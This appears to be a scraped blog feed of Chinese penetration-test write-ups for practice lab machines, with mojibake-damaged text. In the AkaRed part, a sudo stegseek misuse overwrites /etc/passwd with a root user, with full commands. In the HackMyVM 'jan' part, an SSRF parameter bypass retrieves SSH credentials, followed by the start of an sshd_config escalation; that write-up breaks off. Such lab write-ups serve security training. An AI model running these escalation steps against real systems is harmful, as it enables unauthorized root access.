  www-data@AkaRed:/var/www/html$ ls /home/
  welcome
  ```

  Á°ÆËÆ§Â≠òÂú®Áî®Êà∑ `welcome`„ÄÇ

* **Ê£ÄÊü• `/opt` ÁõÆÂΩï:**

  ```bash
  www-data@AkaRed:/opt$ ls -al
  total 32
  # ...
  -rwxr-xr-x  1 root root 16912 Apr 11 06:41 showmepassword
  ```

  ÂèëÁé∞‰∏Ä‰∏™Âêç‰∏∫ `showmepassword` ÁöÑÂèØÊâßË°åÊñá‰ª∂„ÄÇ

* **ËøêË°å `showmepassword`:**

  ```bash
  www-data@AkaRed:/opt$ ./showmepassword 
  input to /tmp/xxoo
  when input 1000 count. u will get password.
  now it is 1 count.
  ```

  Á®ãÂ∫èÊèêÁ§∫ÈúÄË¶ÅËøêË°å 1000 Ê¨°ÊâçËÉΩËé∑ÂæóÂØÜÁ†Å„ÄÇ

* **ÁºñÂÜôËÑöÊú¨ËøêË°å 1000 Ê¨°:**

  ```bash
  www-data@AkaRed:/opt$ for i in {1..1000}; do ./showmepassword; done
  # ... (Â§ßÈáèËæìÂá∫ÁúÅÁï•) ...
  input to /tmp/xxoo
  when input 1000 count. u will get password.
  now it is 998 count.
  input to /tmp/xxoo
  when input 1000 count. u will get password.
  d2VsY2  # &lt;-- Ëé∑ÂèñÂà∞ÂØÜÁ†ÅÁâáÊÆµ
  input to /tmp/xxoo
  when input 1000 count. u will get password.
  d2VsY2
  input to /tmp/xxoo
  when input 1000 count. u will get password.
  d2VsY2
  ```

  Âú®Êé•Ëøë 1000 Ê¨°Êó∂ÔºåÁ®ãÂ∫èËæìÂá∫‰∫ÜÂ≠óÁ¨¶‰∏≤ `d2VsY2`„ÄÇËøôÂæàÂèØËÉΩÊòØ `welcome` Áî®Êà∑ÁöÑÂØÜÁ†Å„ÄÇ

### 3.2. ÂàáÊç¢Áî®Êà∑ (Switching User)

‰ΩøÁî®‰ªé `showmepassword` Ëé∑ÂèñÁöÑÂØÜÁ†Å `d2VsY2` Â∞ùËØïÂàáÊç¢Âà∞ `welcome` Áî®Êà∑„ÄÇ

```bash
www-data@AkaRed:/opt$ su welcome
Password: &lt;Âú®Ê≠§ËæìÂÖ• 'd2VsY2'&gt;
welcome@AkaRed:/opt$ id
uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)
```

ÊàêÂäüÂàáÊç¢Âà∞ `welcome` Áî®Êà∑„ÄÇ

## 4. ÊùÉÈôêÊèêÂçá (welcome -&gt; root)

Ê≠§Èò∂ÊÆµÁõÆÊ†áÊòØ‰ªé `welcome` Áî®Êà∑ÊèêÂçáÂà∞ `root` Áî®Êà∑„ÄÇ

### 4.1. ‰ª• welcome Ë∫´‰ªΩËøõË°å‰ø°ÊÅØÊî∂ÈõÜ (Enumeration as welcome)

Ê£ÄÊü• `welcome` Áî®Êà∑ÁöÑ `sudo` ÊùÉÈôê„ÄÇ

```bash
welcome@AkaRed:/opt$ sudo -l
Matching Defaults entries for welcome on AkaRed:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User welcome may run the following commands on AkaRed:
    (ALL : ALL) NOPASSWD: /usr/local/bin/stegseek
```

ÂÖ≥ÈîÆÂèëÁé∞ÔºöÁî®Êà∑ `welcome` ÂèØ‰ª• **Êó†ÈúÄÂØÜÁ†Å** (`NOPASSWD`) ‰ª• **‰ªª‰ΩïÁî®Êà∑** (`ALL : ALL`) ÁöÑË∫´‰ªΩËøêË°å `/usr/local/bin/stegseek` ÂëΩ‰ª§„ÄÇ`stegseek` ÊòØ‰∏Ä‰∏™Áî®‰∫éÁ†¥Ëß£ `steghide` ÈöêÂÜôÂØÜÁ†ÅÂπ∂ÊèêÂèñÈöêËóèÊñá‰ª∂ÁöÑÂ∑•ÂÖ∑„ÄÇÂÖ∂ `-xf &lt;outfile&gt;` ÈÄâÈ°πÂÖÅËÆ∏Â∞ÜÊèêÂèñÁöÑÊñá‰ª∂ÂÜôÂÖ•ÊåáÂÆöË∑ØÂæÑÔºåËøôÊòØ‰∏Ä‰∏™ÊΩúÂú®ÁöÑÊèêÊùÉÂêëÈáè„ÄÇ

### 4.2. Âà©Áî®Á≠ñÁï• (Exploitation Strategy)

Âà©Áî® `sudo stegseek` ÁöÑ `-xf` ÈÄâÈ°πË¶ÜÁõñ `/etc/passwd` Êñá‰ª∂Ôºå‰ªéËÄåÊ∑ªÂä†‰∏Ä‰∏™Ëá™ÂÆö‰πâÁöÑ root Áî®Êà∑„ÄÇ

1.  **Âú®ÊîªÂáªËÄÖÊú∫Âô®‰∏äÔºö**
    *   ÂàõÂª∫‰∏Ä‰∏™ÂåÖÂê´Ëá™ÂÆö‰πâ root Áî®Êà∑Êù°ÁõÆÁöÑÊñá‰ª∂ (`malicious_passwd`)„ÄÇËØ•Êù°ÁõÆ‰ΩøÁî®Â∑≤Áü•ÁöÑÂØÜÁ†ÅÂìàÂ∏å„ÄÇ
    *   ‰ΩøÁî® `steghide` Â∞ÜÊ≠§Êñá‰ª∂ÈöêËóèÂà∞‰∏Ä‰∏™ÂõæÁâá (`1.jpg`) ‰∏≠ÔºåÂπ∂ËÆæÁΩÆ‰∏Ä‰∏™ÁÆÄÂçïÁöÑÂØÜÁ†ÅÔºàÂ¶Ç '123456'Ôºâ„ÄÇ
    *   ÂêØÂä® Web ÊúçÂä°Âô®‰ª•ÊâòÁÆ°Ê≠§ÂõæÁâá„ÄÇ
2.  **Âú®ÁõÆÊ†áÊú∫Âô®‰∏ä (‰ª• welcome Áî®Êà∑Ë∫´‰ªΩ)Ôºö**
    *   ‰∏ãËΩΩÂåÖÂê´ÊÅ∂ÊÑè `passwd` Êù°ÁõÆÁöÑÂõæÁâá„ÄÇ
    *   ÂàõÂª∫‰∏Ä‰∏™ÂåÖÂê´ `steghide` ÂØÜÁ†Å ('123456') ÁöÑÊñá‰ª∂„ÄÇ
    *   ‰ΩøÁî® `sudo /usr/local/bin/stegseek &lt;image_file&gt; &lt;password_file&gt; -xf /etc/passwd` ÂëΩ‰ª§ÔºåÂº∫Âà∂ `stegseek` Â∞ÜÈöêËóèÁöÑÊñá‰ª∂ÊèêÂèñÂπ∂Ë¶ÜÁõñÂà∞ `/etc/passwd`„ÄÇ
    *   ‰ΩøÁî®Êñ∞Ê∑ªÂä†ÁöÑ root Áî®Êà∑ÂêçÂíåÂØπÂ∫îÂØÜÁ†ÅËøõË°å `su` ÁôªÂΩï„ÄÇ

### 4.3. ÊûÑÈÄ†Âà©Áî®‰ª£Á†Å (Attacker Machine)

1. **ÂàõÂª∫ÊÅ∂ÊÑè passwd Êñá‰ª∂ (`malicious_passwd`)**:

   *   ÂàõÂª∫‰∏Ä‰∏™Êñ∞Áî®Êà∑ `a`ÔºåUID Âíå GID Âùá‰∏∫ 0 (root ÊùÉÈôê)„ÄÇ
   *   ËÆæÁΩÆ‰∏Ä‰∏™Â∑≤Áü•ÁöÑÂØÜÁ†ÅÂìàÂ∏å„ÄÇËøôÈáå‰ΩøÁî® `$1$user3$rAGRVf5p2jYTqtqOW5cPu/` (ÂÅáËÆæÊîªÂáªËÄÖÁü•ÈÅìÂÖ∂ÂØπÂ∫îÁöÑÊòéÊñáÂØÜÁ†ÅÔºå‰æãÂ¶Ç 'pass123')„ÄÇ

   ```bash
   ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
   ‚îî‚îÄ$ echo 'a:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0:root:/root:/bin/bash' &gt; malicious_passwd 
   ```

2. **ÂáÜÂ§áËΩΩ‰ΩìÂõæÁâá (`1.jpg`)**:

   ```bash
   ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
   ‚îî‚îÄ$ cp ~/Pictures/1.jpg . # Â§çÂà∂‰∏Ä‰∏™‰ªªÊÑèÁöÑ JPG ÂõæÁâá
   ```

3. **‰ΩøÁî® `steghide` ÂµåÂÖ•Êï∞ÊçÆ**:

   ```bash
   ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
   ‚îî‚îÄ$ steghide embed -ef malicious_passwd -cf 1.jpg -p '123456' 
   # -ef: ÊåáÂÆöË¶ÅÂµåÂÖ•ÁöÑÊñá‰ª∂
   # -cf: ÊåáÂÆöËΩΩ‰ΩìÊñá‰ª∂
   # -p: ËÆæÁΩÆÂµåÂÖ•/ÊèêÂèñÂØÜÁ†Å
   embedding 'malicious_passwd' in '1.jpg'... done
   ```

4. **ÂêØÂä® HTTP ÊúçÂä°Âô®ÊâòÁÆ°ÂõæÁâá**:

   ```bash
   ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
   ‚îî‚îÄ$ python3 -m http.server 80 # Âú® 80 Á´ØÂè£ÂêØÂä®ÁÆÄÂçï HTTP ÊúçÂä°Âô®                                                                    
   Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
   ```

### 4.4. ÊâßË°åÂà©Áî®‰ª£Á†Å (Target Machine)

1. **ÂàáÊç¢Âà∞ÂèØÂÜôÁõÆÂΩïÂπ∂‰∏ãËΩΩÂõæÁâá**: `/tmp` ÈÄöÂ∏∏ÊòØÊâÄÊúâÁî®Êà∑ÈÉΩÂèØÂÜôÁöÑÁõÆÂΩï„ÄÇ

   ```bash
   welcome@AkaRed:/opt$ cd /tmp
   welcome@AkaRed:/tmp$ wget http://192.168.205.128/1.jpg
   # ... (‰∏ãËΩΩËæìÂá∫) ...
   2025-04-11 08:29:34 (220 MB/s) - ‚Äò1.jpg‚Äô saved [396237/396237]
   ```

2. **ÂàõÂª∫ÂØÜÁ†ÅÊñá‰ª∂ (`1`)**:

   ```bash
   welcome@AkaRed:/tmp$ echo '123456' &gt; 1
   ```

3. **ÊâßË°å `sudo stegseek` Ë¶ÜÁõñ `/etc/passwd`**:

   ```bash
   welcome@AkaRed:/tmp$ sudo /usr/local/bin/stegseek 1.jpg 1 -xf /etc/passwd
   # &lt;image_file&gt;: ËΩΩ‰ΩìÂõæÁâá
   # &lt;password_file&gt;: ÂåÖÂê´ÂØÜÁ†ÅÁöÑÂ≠óÂÖ∏Êñá‰ª∂
   # -xf /etc/passwd: Â∞ÜÊèêÂèñÁöÑÊñá‰ª∂Âº∫Âà∂ÂÜôÂÖ• /etc/passwd
   StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
      
   [i] Found passphrase: '123456'
   [i] Original filename: 'malicious_passwd'.
   [i] Extracting to '/etc/passwd'.
   the file '/etc/passwd' does already exist. overwrite ? (y/n) 
   y # Á°ÆËÆ§Ë¶ÜÁõñ
   ```

4. **È™åËØÅ `/etc/passwd` ÂÜÖÂÆπ**:

   ```bash
   welcome@AkaRed:/tmp$ cat /etc/passwd
   a:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0:root:/root:/bin/bash
   ```

   Êñá‰ª∂Â∑≤Ë¢´ÊàêÂäü‰øÆÊîπ‰∏∫Âè™ÂåÖÂê´Êàë‰ª¨Ê∑ªÂä†ÁöÑ `a` Áî®Êà∑Êù°ÁõÆ„ÄÇ

### 4.5. Ëé∑Âèñ Root ÊùÉÈôê (Gaining Root Access)

‰ΩøÁî®Êñ∞Ê∑ªÂä†ÁöÑÁî®Êà∑ `a` Âíå‰πãÂâçËÆæÁΩÆÁöÑÂØÜÁ†ÅÔºà‰æãÂ¶Ç 'pass123'ÔºâËøõË°åÁôªÂΩï„ÄÇ

```bash
welcome@AkaRed:/tmp$ su a
Password: &lt;ËæìÂÖ• 'pass123' ÊàñÂØπÂ∫îÂìàÂ∏åÁöÑÂØÜÁ†Å&gt;
a@AkaRed:/tmp# id
uid=0(a) gid=0(root) groups=0(root)
```ÊàêÂäüËé∑Âèñ root ÊùÉÈôê„ÄÇ
```

## 5. ÊÄªÁªì (Conclusion)

Êú¨Ê¨°Ê∏óÈÄèÊµãËØïÈÄöËøá‰ª•‰∏ãÊ≠•È™§ÊàêÂäüËé∑Âèñ‰∫Ü AkaRed Èù∂Êú∫ÁöÑ root ÊùÉÈôêÔºö

1.  **‰ø°ÊÅØÊî∂ÈõÜ:** ÈÄöËøá `arp-scan` Âíå `nmap` ÂèëÁé∞ÁõÆÊ†á IP ÂèäÂºÄÊîæÁöÑ SSH (22) Âíå HTTP (80) Á´ØÂè£„ÄÇ
2.  **ÂàùÂßãËÆøÈóÆ:** Âà©Áî® Web Â∫îÁî® 'CyberPing 2077' (Á´ØÂè£ 80) Â≠òÂú®ÁöÑ **ÂëΩ‰ª§Ê≥®ÂÖ•ÊºèÊ¥û**ÔºåÊâßË°å `netcat` ÂèçÂêë ShellÔºåËé∑Âæó `www-data` Áî®Êà∑ÊùÉÈôê„ÄÇ
3.  **Á¨¨‰∏ÄÊ¨°ÊèêÊùÉ:** Âú® `/opt` ÁõÆÂΩï‰∏ãÂèëÁé∞ **ÁâπÊÆäÁöÑÂèØÊâßË°åÊñá‰ª∂ `showmepassword`**ÔºåÈÄöËøáËÑöÊú¨ËøêË°å 1000 Ê¨°Ëé∑ÂæóÂØÜÁ†Å `d2VsY2`ÔºåÊàêÂäü `su` ÂàáÊç¢Âà∞ `welcome` Áî®Êà∑„ÄÇÔºà`robots.txt` ‰∏≠ÁöÑÂá≠ÊçÆÂú®Ê≠§Ë∑ØÂæÑÊó†ÊïàÔºâ„ÄÇ
4.  **Á¨¨‰∫åÊ¨°ÊèêÊùÉ:** ÂèëÁé∞ `welcome` Áî®Êà∑Êã•Êúâ **Êó†ÈúÄÂØÜÁ†ÅÂç≥ÂèØÈÄöËøá `sudo` ÊâßË°å `/usr/local/bin/stegseek`** ÁöÑÊùÉÈôê„ÄÇÂà©Áî® `stegseek` ÁöÑ `-xf` ÈÄâÈ°πÔºå**Ë¶ÜÁõñ `/etc/passwd` Êñá‰ª∂**ÔºåÊ∑ªÂä†‰∫Ü‰∏Ä‰∏™Ëá™ÂÆö‰πâÁöÑ root Áî®Êà∑ (`a`)ÔºåÊúÄÁªà‰ΩøÁî®ËØ•Áî®Êà∑ÊàêÂäüÁôªÂΩïÔºåËé∑Âæó root ÊùÉÈôê„ÄÇsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/shen-tou-ce-shi-bao-gao-%20-%20AkaRed%20%28-ce-shi-ba-ji-%29.html</guid><pubDate>Fri, 27 Jun 2025 09:28:06 +0000</pubDate></item><item><title>hmv_jan</title><link>https://7r1UMPHK.github.io/post/hmv_jan.html</link><description># 0.ÁÆÄ‰ªã

Èù∂Êú∫Ôºöhttps://hackmyvm.eu/machines/machine.php?vm=jan
 ÈöæÂ∫¶ÔºöÁªøËâ≤
 ÁõÆÊ†á IPÔºö192.168.205.136
 Êú¨Êú∫ IPÔºö192.168.205.128

# 1.Êâ´Êèè

nmapËµ∑Êâã

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nmap -A 192.168.205.136
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-03 12:40 CST
Nmap scan report for 192.168.205.136
Host is up (0.00023s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.9 (protocol 2.0)
| ssh-hostkey: 
|   256 2c:0b:57:a2:b3:e2:0f:6a:c0:61:f2:b7:1f:56:b4:42 (ECDSA)
|_  256 45:97:b0:2b:48:9b:4a:36:8e:db:44:bd:3f:15:cf:32 (ED25519)
8080/tcp open  http    Golang net/http server
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Date: Mon, 03 Feb 2025 04:40:49 GMT
|     Content-Length: 45
|     Content-Type: text/plain; charset=utf-8
|     Welcome to our Public Server. Maybe Internal.
|   GenericLines, Help, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, Socks5: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   OfficeScan: 
|     HTTP/1.1 400 Bad Request: missing required Host header
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|_    Request: missing required Host header
|_http-open-proxy: Proxy might be redirecting requests
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.95%I=7%D=2/3%Time=67A048E1%P=x86_64-pc-linux-gnu%r(Get
SF:Request,A2,'HTTP/1\.0\x20200\x20OK\r\nDate:\x20Mon,\x2003\x20Feb\x20202
SF:5\x2004:40:49\x20GMT\r\nContent-Length:\x2045\r\nContent-Type:\x20text/
SF:plain;\x20charset=utf-8\r\n\r\nWelcome\x20to\x20our\x20Public\x20Server
SF:\.\x20Maybe\x20Internal\.')%r(HTTPOptions,A2,'HTTP/1\.0\x20200\x20OK\r\
SF:nDate:\x20Mon,\x2003\x20Feb\x202025\x2004:40:49\x20GMT\r\nContent-Lengt
SF:h:\x2045\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n\r\nWelcom
SF:e\x20to\x20our\x20Public\x20Server\.\x20Maybe\x20Internal\.')%r(RTSPReq
SF:uest,67,'HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/pl
SF:ain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Requ
SF:est')%r(FourOhFourRequest,A2,'HTTP/1\.0\x20200\x20OK\r\nDate:\x20Mon,\x
SF:2003\x20Feb\x202025\x2004:40:49\x20GMT\r\nContent-Length:\x2045\r\nCont
SF:ent-Type:\x20text/plain;\x20charset=utf-8\r\n\r\nWelcome\x20to\x20our\x
SF:20Public\x20Server\.\x20Maybe\x20Internal\.')%r(Socks5,67,'HTTP/1\.1\x2
SF:0400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8
SF:\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request')%r(GenericLines,
SF:67,'HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\
SF:x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request')
SF:%r(Help,67,'HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
SF:/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20R
SF:equest')%r(SSLSessionReq,67,'HTTP/1\.1\x20400\x20Bad\x20Request\r\nCont
SF:ent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r
SF:\n400\x20Bad\x20Request')%r(LPDString,67,'HTTP/1\.1\x20400\x20Bad\x20Re
SF:quest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x
SF:20close\r\n\r\n400\x20Bad\x20Request')%r(SIPOptions,67,'HTTP/1\.1\x2040
SF:0\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\
SF:nConnection:\x20close\r\n\r\n400\x20Bad\x20Request')%r(OfficeScan,A3,'H
SF:TTP/1\.1\x20400\x20Bad\x20Request:\x20missing\x20required\x20Host\x20he
SF:ader\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x2
SF:0close\r\n\r\n400\x20Bad\x20Request:\x20missing\x20required\x20Host\x20
SF:header');
MAC Address: 08:00:27:3A:49:D7 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.23 ms 192.168.205.136

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.01 seconds
                                                                             
```

8080Á´ØÂè£sTÂíåsSÂèÇÊï∞Êé¢Êµã‰∏çÂá∫Êù•ÔºåÊâÄ‰ª•Âª∫ËÆÆ‰∏ç‰ΩøÁî®

# 2.Ë∏©ÁÇπ

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl http://192.168.205.136:8080/                            
Welcome to our Public Server. Maybe Internal.                                                                                                                                    
```

ËøõË°åÁõÆÂΩïÁàÜÁ†¥

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ feroxbuster -u http://192.168.205.136:8080 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,md,txt
                                                                                                                                    
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben 'epi' Risher ü§ì                 ver: 2.11.0
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 üéØ  Target Url            ‚îÇ http://192.168.205.136:8080
 üöÄ  Threads               ‚îÇ 50
 üìñ  Wordlist              ‚îÇ /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt
 üëå  Status Codes          ‚îÇ All Status Codes!
 üí•  Timeout (secs)        ‚îÇ 7
 ü¶°  User-Agent            ‚îÇ feroxbuster/2.11.0
 üíâ  Config File           ‚îÇ /etc/feroxbuster/ferox-config.toml
 üîé  Extract Links         ‚îÇ true
 üí≤  Extensions            ‚îÇ [php, html, md, txt]
 üèÅ  HTTP methods          ‚îÇ [GET]
 üîÉ  Recursion Depth       ‚îÇ 4
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 üèÅ  Press [ENTER] to use the Scan Management Menu‚Ñ¢
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
200      GET        1l        7w       45c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                   
400      GET        1l        3w       24c http://192.168.205.136:8080/redirect
200      GET        2l        2w       16c http://192.168.205.136:8080/robots.txt
[####################] - 54s   598005/598005  0s      found:2       errors:0    
[####################] - 54s   598005/598005  11090/s http://192.168.205.136:8080/           
```

Êé¢Á¥¢‰∏ÄÊ≥¢

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl http://192.168.205.136:8080/redirect
Parameter 'url' needed.
                                                                                                                                    
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl http://192.168.205.136:8080/robots.txt
/redirect
/credz                                                                                                                                    
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl http://192.168.205.136:8080/credz   
Only accessible internally.                                                                                                                                    
```

ÁõÆÂâçÊù•ÁúãÂá∫È¢òÊÄùË∑ØÊòØÈÄöËøá/redirectËÆøÈóÆ/credzÔºåËøõË°åÂ∞ùËØï

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl http://192.168.205.136:8080/credz   
Only accessible internally.                                                                                                                                    
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl http://192.168.205.136:8080/redirect?url=127.0.0.1:8080/robots.txt
Only accessible internally.                                                                                                                                    
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl -I http://192.168.205.136:8080/redirect?url=127.0.0.1:8080/robots.txt
HTTP/1.1 200 OK
Date: Mon, 03 Feb 2025 04:47:07 GMT
Content-Length: 27
Content-Type: text/plain; charset=utf-8
```

ËøôÈáåÊàëÊµãËØï‰∫ÜÊå∫Â§öÁªïËøáÊ£ÄÊµãÁöÑÊñπÊ≥ïÔºåÊàëÂ∞±‰∏çÂÜôÂá∫Êù•‰∫ÜÔºåÊ≠£Á°ÆÊñπÊ≥ïÊòØ

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl 'http://192.168.205.136:8080/redirect?url=127.0.0.1:8080/robots.txt&amp;url=192.168.205.136:8080/credz'
                                         
```

ËøîÂõûÁ©∫ÁôΩÔºåÁ©∫ÁôΩÂ∞±ÊòØÊúâÊú∫ÂèØÂØª

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl 'http://192.168.205.136:8080/redirect?url=127.0.0.1:8080/robots.txt&amp;url=127.0.0.1:8080/credz'
                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl 'http://192.168.205.136:8080/redirect?url=127.0.0.1:8080/robots.txt&amp;url=/credz'            
ssh/EazyLOL                                                                                                                                     
```

ÁôªÂΩï

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ ssh ssh@192.168.205.136
The authenticity of host '192.168.205.136 (192.168.205.136)' can't be established.
ED25519 key fingerprint is SHA256:tkz/GarJpLwrGFZmgpweGf70u9znUcXycaHKGhfPRCc.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:3: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.136' (ED25519) to the list of known hosts.
ssh@192.168.205.136's password: 
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See &lt;https://wiki.alpinelinux.org/&gt;.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

jan:~$ id
uid=1000(ssh) gid=1000(ssh) groups=1000(ssh)
```

# 4.ÊèêÊùÉ

```
jan:~$ ls -al
total 12
drwxr-sr-x    2 ssh      ssh           4096 Jan 28 09:27 .
drwxr-xr-x    3 root     root          4096 Jan 28 09:08 ..
lrwxrwxrwx    1 root     ssh              9 Jan 28 09:27 .ash_history -&gt; /dev/null
-rw-------    1 ssh      ssh             22 Jan 28 09:20 user.txt
jan:~$ sudo -l
Matching Defaults entries for ssh on jan:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for ssh:
    Defaults!/usr/sbin/visudo env_keep+='SUDO_EDITOR EDITOR VISUAL'

User ssh may run the following commands on jan:
    (root) NOPASSWD: /sbin/service sshd restart
```

Â§ßÊ¶ÇÁéáÊòØÊîπsshÁöÑÈÖçÁΩÆÊñá‰ª∂‰∫ÜÔºåÁúãÁúãÊúâÊ≤°ÊúâÊùÉÈôê

```
jan:~$ ls -al /etc/ssh/sshd_config
-rw-rw-rw-    1 root     root          3355 Jan 28 09:01 /etc/ssh/sshd_config
```

ÊúâÊùÉÈôêÔºåÈÇ£Êàë‰ª¨ÁîüÊàê‰∏Ä‰∏™ÂØÜÈí•ÔºåÈÄöËøáÂØÜÈí•ÁôªÂΩïrootÂ∞±Â•Ω‰∫Ü

```
jan:~$ ssh-keygen -t rsa 
Generating public/private rsa key pair.
Enter file in which to save the key (/home/ssh/.ssh/id_rsa): 
Created directory '/home/ssh/.ssh'.
Enter passphrase for '/home/ssh/.ssh/id_rsa' (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/ssh/.ssh/id_rsa
Your public key has been saved in /home/ssh/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:FNapkUoVgyB2BhdqurZup7sNDvaCmQhWvV/OC5czxA8 ssh@jan
The key's randomart image is:
+---[RSA 3072]----+
|  +.*o o*+ .     |
| . *  o.ooo      |
|  o .. ..o       |
| o . ...o        |
|. .   . SE       |
|.o   .  ..+      |
|B*    ..+= .     |
|Xo=.   .ooo      |
|oB*o     ..      |
+----[SHA256]-----+

jan:~$ cp .ssh/id_rsa.pub /tmp/authorized_keys
jan:~$ chmod 600 /tmp/authorized_keys 
jan:~$ ls -la /tmp/
total 8
drwxrwxrwt    4 root     root           100 Feb  3 04:56 .
drwxr-xr-x   21 root     root          4096 Jan 28 09:01 ..
drwxrwxrwt    2 root     root            40 Feb  3 04:39 .ICE-unix
drwxrwxrwt    2 root     root            40 Feb  3 04:39 .X11-unix
-rw-------    1 ssh      ssh            561 Feb  3 04:56 authorized_keys

